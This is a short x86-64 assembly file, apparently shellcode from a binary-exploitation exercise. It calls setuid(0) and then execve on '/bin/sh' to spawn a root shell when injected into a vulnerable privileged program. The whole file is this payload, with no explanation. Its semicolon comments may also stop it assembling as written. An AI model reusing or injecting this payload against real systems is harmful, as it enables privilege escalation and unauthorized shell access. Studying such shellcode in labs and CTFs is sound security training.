.global _start

_start: 
.intel_syntax noprefix
	mov rax, 0x69		; setuid 
	mov rdi, 0
	syscall 
	
	mov rax, 0x3b 		; execve
	lea rdi, [rip+filename]
	mov rsi, 0
	mov rdx, 0
	syscall 

filename:
	.string "/bin/sh"
